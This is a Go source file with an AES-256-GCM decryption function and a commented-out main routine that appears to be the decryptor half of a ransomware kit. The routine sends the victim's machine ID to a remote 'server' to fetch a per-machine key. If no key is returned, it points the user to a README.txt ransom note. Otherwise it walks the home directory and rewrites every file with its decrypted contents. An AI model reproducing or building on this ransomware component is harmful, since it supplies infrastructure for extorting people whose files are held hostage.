package decrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"errors"
)

// Decrypt decrypts data using 256-bit AES-GCM.  This both hides the content of
// the data and provides a check that it hasn't been altered. Expects input
// form nonce|ciphertext|tag where '|' indicates concatenation.
func Decrypt(ciphertext []byte, key *[32]byte) (plaintext []byte, err error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	if len(ciphertext) < gcm.NonceSize() {
		return nil, errors.New("malformed ciphertext")
	}

	return gcm.Open(nil,
		ciphertext[:gcm.NonceSize()],
		ciphertext[gcm.NonceSize():],
		nil,
	)
}

/*
func main() {
	var files []string
	var counter int = 1
	var home string

	id, err := machineid.ID()
	if err != nil {
		log.Fatal(err)
	}

	payload := url.Values{}
	payload.Set("id", id)

	resp, err := http.Get("http://" + server + "/key/?" + payload.Encode())
	if err != nil {
		log.Fatal(err)
	}
	responseData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	key := string(responseData)

	if len(key) == 0 {
		fmt.Println("Please follow the instructions in the README.txt file to decrypt your files")
		fmt.Print("Press 'Enter' to continue")
		bufio.NewReader(os.Stdin).ReadBytes('\n')
		return
	}
	decryptionKey := DecodeKey(key)

	if runtime.GOOS == "windows" {
		home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
	} else {
		home = os.Getenv("HOME")
	}

	err = filepath.Walk(home, Visit(&files))
	if err != nil {
		panic(err)
	}
	for _, file := range files {
		fmt.Printf("\rDecrypting %d/%d: %s", counter, len(files), file)

		data, err := ioutil.ReadFile(file)
		if err != nil {
			continue
		}

		decrypted, err := Decrypt(data, decryptionKey)
		if err != nil {
			log.Println(err)
			continue
		}

		err = ioutil.WriteFile(file, decrypted, 0644)
		if err != nil {
			continue
		}
		counter++
	}
	fmt.Printf("\n%d files decrypted.\n", len(files))
}
*/
